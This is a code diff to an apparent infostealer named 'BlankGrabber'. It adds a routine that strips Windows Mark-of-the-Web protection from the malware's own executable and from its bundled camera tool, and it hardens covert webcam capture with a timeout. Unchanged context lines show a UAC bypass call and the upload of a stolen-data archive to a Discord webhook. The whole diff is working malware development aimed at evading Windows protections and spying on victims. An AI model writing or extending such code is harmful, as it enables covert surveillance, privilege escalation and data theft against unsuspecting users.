@@ -89,6 +89,13 @@ class system:
         return s == 0
     
     @staticmethod
+    def unblockMOTW(path) -> None:
+        if os.path.isfile(path):
+            name = os.path.basename(path)
+            dir = os.path.dirname(path)
+            subprocess.run(f"powershell Unblock-File '.\{name}'", shell= True, capture_output= True, cwd= dir)
+    
+    @staticmethod
     def UACbypass():
         if not hasattr(sys, 'frozen'):
             return
@@ -956,6 +963,7 @@ class BlankGrabber:
     def webshot(self):
         if not CAPTURE_WEBCAM or not os.path.isfile(Camfile := os.path.join(MEIPASS, 'Camera')):
             return
+        system.unblockMOTW(Camfile)
         def isMonochrome(path):
             return __import__("functools").reduce(lambda x, y: x and y < 0.005, ImageStat.Stat(Image.open(path)).var, True)
 
@@ -973,7 +981,10 @@ class BlankGrabber:
         tempCamPath = os.path.dirname(tempCam)
         camlist = [x[15:] for x in subprocess.run('Camera.exe /devlist', capture_output= True, shell= True, cwd= tempCamPath).stdout.decode(errors= 'ignore').splitlines() if "Device name:" in x]
         for index, name in enumerate(camlist):
-            subprocess.run('Camera.exe /devnum {} /quiet /filename image.bmp'.format(index + 1), shell= True, capture_output= True, cwd= tempCamPath).stdout.decode(errors= 'ignore')
+            try:
+                subprocess.run('Camera.exe /devnum {} /quiet /filename image.bmp'.format(index + 1), shell= True, capture_output= True, cwd= tempCamPath, timeout= 5.0).stdout.decode(errors= 'ignore')
+            except subprocess.TimeoutExpired:
+                return
             if not os.path.isfile(tempimg := os.path.join(tempCamPath, 'image.bmp')):
                 continue
             if isMonochrome(tempimg):
@@ -1020,7 +1031,9 @@ class BlankGrabber:
             self.http.request('POST', WEBHOOK, fields= {'file' : (self.archive, file.read())}, headers= Discord.getHeaders())
 
 if __name__ == '__main__':
-    FROZEN = hasattr(sys, 'frozen')
+    if FROZEN := hasattr(sys, 'frozen'):
+        Thread(target= system.unblockMOTW, args= [sys.executable], daemon= True).start()
+
     if not system.isAdmin():
         system.UACbypass()
     
